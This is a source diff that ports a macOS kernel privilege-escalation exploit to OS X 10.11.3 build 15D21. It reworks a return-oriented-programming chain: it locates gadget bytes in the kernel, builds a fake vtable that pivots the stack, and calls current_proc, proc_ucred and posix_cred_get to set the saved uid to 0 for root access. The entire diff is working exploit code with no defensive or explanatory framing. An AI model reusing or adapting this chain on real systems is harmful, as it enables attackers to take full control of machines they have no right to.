@@ -9,6 +9,11 @@
  *   user space.
  */
 
+/*
+ * Modified for targeting 0S X 10.11.3 build 15D21
+ * By vvun91e0n
+ */
+
 #include "kernel_rop.h"
 
 #include <IOKit/IOKitLib.h>
@@ -18,15 +23,26 @@
 
 #include "kernel_image.h"
 
-static const uint8_t xchg_esp_eax_pop_rsp_ins[] = {
+static const uint8_t xchg_eax_esp_ins[] = {
 	0x94,   /* xchg esp, eax */
+	0xc3,   /* ret           */
+};
+
+static const uint8_t pop_rsp_ins[] = {
 	0x5c,   /* pop rsp       */
 	0xc3,   /* ret           */
 };
-static const uint8_t xchg_rax_rdi_ins[] = {
-	0x48, 0x97,     /* xchg rax, rdi */
-	0xc3,           /* ret           */
+
+static const uint8_t mov_rdi_rax_call_rbx_ins[] = {
+	0x48, 0x89, 0xc7,   /* mov rdi, rax      */
+	0xff, 0xd3,         /* call rbx          */
 };
+
+static const uint8_t pop_rbx_ins[] = {
+	0x5b,   /* pop rbx       */
+	0xc3,   /* ret           */
+};
+
 static const uint8_t set_svuid_0_ins[] = {
 	0xc7, 0x47, 0x08, 0x00, 0x00, 0x00, 0x00,       /* mov dword ptr [rdi+8], 0 */
 	0xc3,                                           /* ret                      */
@@ -43,11 +59,14 @@ static const uint8_t set_svuid_0_ins[] = {
    kernel we can elevate privileges by calling seteuid(0). */
 int
 build_rop_payload() {
-	uint64_t xchg_esp_eax_pop_rsp, xchg_rax_rdi, set_svuid_0;
+	uint64_t set_svuid_0;
+    	uint64_t xchg_eax_esp, pop_rsp, mov_rdi_rax_call_rbx, pop_rbx;
 	uint64_t current_proc, proc_ucred, posix_cred_get, thread_exception_return;
 	int err = 0;
-	err |= find_kernel_bytes(xchg_esp_eax_pop_rsp_ins, sizeof(xchg_esp_eax_pop_rsp_ins), &xchg_esp_eax_pop_rsp);
-	err |= find_kernel_bytes(xchg_rax_rdi_ins, sizeof(xchg_rax_rdi_ins), &xchg_rax_rdi);
+    	err |= find_kernel_bytes(xchg_eax_esp_ins, sizeof(xchg_eax_esp_ins),&xchg_eax_esp);
+    	err |= find_kernel_bytes(pop_rsp_ins, sizeof(pop_rsp_ins),&pop_rsp);
+    	err |= find_kernel_bytes(mov_rdi_rax_call_rbx_ins, sizeof(mov_rdi_rax_call_rbx_ins),&mov_rdi_rax_call_rbx);
+    	err |= find_kernel_bytes(pop_rbx_ins, sizeof(pop_rbx_ins),&pop_rbx);
 	err |= find_kernel_bytes(set_svuid_0_ins, sizeof(set_svuid_0_ins), &set_svuid_0);
 	if (err) {
 		printf("error: could not locate ROP gadgets\n");
@@ -71,18 +90,32 @@ build_rop_payload() {
 		return 3;
 	}
 	uint64_t * vtable = (uint64_t *)payload_addr;
-	uint64_t * rop_stack = ((uint64_t *)(payload_addr + size)) - 8;
+	uint64_t * rop_stack = ((uint64_t *)(payload_addr + size)) - 14;
 	/* Virtual method 4 is called in the kernel with rax set to 0. */
-	vtable[0] = (uint64_t)rop_stack;        /*  *0 = rop_stack                  */
-	vtable[4] = xchg_esp_eax_pop_rsp;       /*  rsp = 0; rsp = *rsp; start rop  */
+	vtable[0] = pop_rsp;                    /*  rsp = *0                        */
+        vtable[1] = (uint64_t)rop_stack;        /*  *0x8 = rop_stack                */
+	vtable[4] = xchg_eax_esp;               /*  rsp = 0; start rop              */
+	
 	rop_stack[0] = current_proc;            /*  rax = &proc                     */
-	rop_stack[1] = xchg_rax_rdi;            /*  rdi = &proc                     */
-	rop_stack[2] = proc_ucred;              /*  rax = &cred                     */
-	rop_stack[3] = xchg_rax_rdi;            /*  rdi = &cred                     */
-	rop_stack[4] = posix_cred_get;          /*  rax = &posix_cred               */
-	rop_stack[5] = xchg_rax_rdi;            /*  rdi = &posix_cred               */
-	rop_stack[6] = set_svuid_0;             /*  we are now setuid 0             */
-	rop_stack[7] = thread_exception_return; /*  stop rop                        */
+	
+    	rop_stack[1] = pop_rbx;                 /*  rbx = pop_rbx address           */
+    	rop_stack[2] = pop_rbx;                 /*  pop call address ret            */
+    	rop_stack[3] = mov_rdi_rax_call_rbx;    /*  rdi = rax   call rbx            */
+
+	rop_stack[4] = proc_ucred;              /*  rax = &cred                     */
+
+    	rop_stack[5] = pop_rbx;                 /*  rbx = pop_rbx address           */
+    	rop_stack[6] = pop_rbx;                 /*  pop call address ret            */
+    	rop_stack[7] = mov_rdi_rax_call_rbx;    /*  rdi = rax   call rbx            */
+
+	rop_stack[8] = posix_cred_get;          /*  rax = &posix_cred               */
+
+    	rop_stack[9] = pop_rbx;                 /*  rbx = pop_rbx address           */
+    	rop_stack[10] = pop_rbx;                 /*  pop call address ret            */
+    	rop_stack[11] = mov_rdi_rax_call_rbx;    /*  rdi = rax   call rbx            */
+
+	rop_stack[12] = set_svuid_0;             /*  we are now setuid 0             */
+	rop_stack[13] = thread_exception_return; /*  stop rop                        */
 	return 0;
 }
 
